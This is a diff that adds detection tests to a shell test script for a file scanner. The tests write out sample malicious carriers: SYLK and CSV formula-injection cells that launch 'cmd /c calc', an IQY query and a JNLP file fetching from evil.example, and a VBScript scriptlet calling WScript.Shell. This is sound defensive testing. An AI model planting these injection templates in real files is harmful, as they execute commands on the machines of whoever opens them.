@@ -7997,6 +7997,47 @@ EOF
 ./hlse_core file "$XDIR/mention.doc" 2>&1 | grep -q "VBA macro indicators" \
     && check "file: OLE VBA-mention stays 35" "0" "0" \
     || check "file: OLE VBA-mention stays 35" "0" "1"
+# F44–F46: spreadsheet injection / jnlp / sct carriers
+printf 'ID;P\nO;E\nNN;NAuto_open;ER101C1;KOut Files;F\nC;X1;Y101;EEXEC("cmd /c calc")\nE\n' \
+    > "$XDIR/x.slk"
+./hlse_core file "$XDIR/x.slk" 2>&1 | grep -q "FORMULA INJECTION" \
+    && check "file: slk EEXEC flagged" "0" "0" \
+    || check "file: slk EEXEC flagged" "0" "1"
+printf 'ID;P\nO;E\nC;X1;Y1;K"data"\nE\n' > "$XDIR/ok.slk"
+./hlse_core file "$XDIR/ok.slk" 2>&1 | grep -q "FORMULA INJECTION" \
+    && check "file: data-only slk no F44" "0" "1" \
+    || check "file: data-only slk no F44" "0" "0"
+printf 'name,cmd\n=cmd|"/c calc"!A0,b\n' > "$XDIR/x.csv"
+./hlse_core file "$XDIR/x.csv" 2>&1 | grep -q "FORMULA INJECTION" \
+    && check "file: csv =cmd| cell flagged" "0" "0" \
+    || check "file: csv =cmd| cell flagged" "0" "1"
+printf 'a,b,c\n1,2,3\n' > "$XDIR/ok.csv"
+./hlse_core file "$XDIR/ok.csv" 2>&1 | grep -q "FORMULA INJECTION" \
+    && check "file: numeric csv no F44" "0" "1" \
+    || check "file: numeric csv no F44" "0" "0"
+printf 'WEB\n1\nhttp://evil.example/q.txt\n' > "$XDIR/x.iqy"
+./hlse_core file "$XDIR/x.iqy" 2>&1 | grep -q "FORMULA INJECTION" \
+    && check "file: remote iqy flagged" "0" "0" \
+    || check "file: remote iqy flagged" "0" "1"
+printf '<?xml version="1.0"?>\n<jnlp codebase="http://evil.example"><resources><jar href="evil.jar"/></resources></jnlp>\n' \
+    > "$XDIR/x.jnlp"
+./hlse_core file "$XDIR/x.jnlp" 2>&1 | grep -q "JNLP" \
+    && check "file: remote-codebase jnlp flagged" "0" "0" \
+    || check "file: remote-codebase jnlp flagged" "0" "1"
+printf '<?xml version="1.0"?>\n<jnlp codebase="."><resources><jar href="local.jar"/></resources></jnlp>\n' \
+    > "$XDIR/ok.jnlp"
+./hlse_core file "$XDIR/ok.jnlp" 2>&1 | grep -q "JNLP" \
+    && check "file: local jnlp no F45" "0" "1" \
+    || check "file: local jnlp no F45" "0" "0"
+printf '<scriptlet><registration progid="x"><script language="VBScript">CreateObject("WScript.Shell").Run "calc"</script></registration></scriptlet>\n' \
+    > "$XDIR/x.sct"
+./hlse_core file "$XDIR/x.sct" 2>&1 | grep -q "SCT SCRIPTLET" \
+    && check "file: sct shell scriptlet flagged" "0" "0" \
+    || check "file: sct shell scriptlet flagged" "0" "1"
+printf 'plain text\n' > "$XDIR/note.sct"
+./hlse_core file "$XDIR/note.sct" 2>&1 | grep -q "SCT SCRIPTLET" \
+    && check "file: non-scriptlet sct no F46" "0" "1" \
+    || check "file: non-scriptlet sct no F46" "0" "0"
 mkdir -p "$XDIR/ng"
 printf '<?xml version="1.0"?>\n<configuration><packageSources><add key="x" value="https://evil.example/nuget"/></packageSources></configuration>\n' \
     > "$XDIR/ng/nuget.config"
